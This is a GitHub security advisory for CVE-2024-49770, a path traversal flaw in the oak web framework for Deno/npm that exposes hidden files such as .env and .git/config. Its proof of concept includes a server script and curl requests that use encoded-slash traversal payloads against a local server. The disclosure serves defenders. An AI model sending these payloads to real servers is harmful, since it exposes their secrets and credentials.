# [H] Path traversal in oak allows transfer of hidden files within the served root directory

## Summary
Severity: High
Advisory: GHSA-qm92-93fv-vh7m
CVE: CVE-2024-49770
CWE: CWE-22, CWE-35
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2024-11-01
Source: https://github.com/advisories/GHSA-qm92-93fv-vh7m
Type: github-advisory

## Affected
- npm: `@oakserver/oak` — affected >=0

## Details
### Summary

By default `oak` does not allow transferring of hidden files with `Context.send` API. However, this can be bypassed by
encoding `/` as its URL encoded form `%2F`.

### Details

1.) Oak uses [decodeComponent](https://github.com/oakserver/oak/blob/3896fe568b25ac0b4c5afbf822ff8344c3d1712a/send.ts#L182C10-L182C25) which seems to be unexpected. This is also the reason why it is not possible to access a file that
contains URL encoded characters unless the client URL encodes it first.

2.) The function [isHidden](https://github.com/oakserver/oak/blob/3896fe568b25ac0b4c5afbf822ff8344c3d1712a/send.ts#L117-L125) is flawed since it only checks if the first subpath is hidden, allowing secrets to be read from `subdir/.env`.

### PoC

```ts
// server.ts

import { Application } from "jsr:@oak/oak@17.1.2";

const app = new Application();

app.use(async (context, next) => {
  try {
    await context.send({
      root: './root',
      hidden: false, // default
    });
  } catch {
    await next();
  }
});

await app.listen({ port: 8000 });
```

In terminal:

```bash
# setup root directory
mkdir root/.git
echo SECRET_KEY=oops > root/.env
echo oops >  root/.git/config

# start server
deno run -A server.ts

# in another terminal
curl -D- http://127.0.0.1:8000/poc%2f../.env
curl -D- http://127.0.0.1:8000/poc%2f../.git/config
```

### Impact

For an attacker this has potential to read sensitive user data or to gain access to server secrets.

## References
- https://github.com/oakserver/oak/security/advisories/GHSA-qm92-93fv-vh7m
- https://nvd.nist.gov/vuln/detail/CVE-2024-49770
- https://github.com/oakserver/oak/commit/4b2f27efd5cba5a45b2c3982e610da3af0869209
- https://github.com/oakserver/oak
- https://github.com/oakserver/oak/blob/3896fe568b25ac0b4c5afbf822ff8344c3d1712a/send.ts#L117-L125
- https://github.com/oakserver/oak/blob/3896fe568b25ac0b4c5afbf822ff8344c3d1712a/send.ts#L182C10-L182C25
